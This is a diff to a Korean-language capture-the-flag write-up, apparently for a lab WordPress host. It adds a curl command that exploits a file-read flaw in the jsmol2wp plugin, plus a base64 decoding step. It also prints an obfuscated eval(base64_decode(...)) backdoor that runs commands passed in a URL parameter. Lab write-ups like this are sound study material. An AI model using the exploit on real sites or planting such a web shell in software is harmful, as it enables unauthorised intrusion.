@@ -369,7 +369,12 @@ http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=g
 
 # 플러그인 파일 구조 (php)
 
+# IP: 10.10.52.253
+
 # 취약한 코드 및 base64 텍스트 발견 -> eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
+
+curl "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/read=convert.base64-encode/resource=../../hello.php" > hello.b64
+base64 -d hello.b64 > hello.php
 
 ```
 <?php
@@ -478,6 +483,8 @@ add_action( 'admin_head', 'dolly_css' );
 ```
 
 # base64 decode
+
+# IP: 10.10.52.253
 
 echo -n "CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | tr -d '=' | base64 -d
 
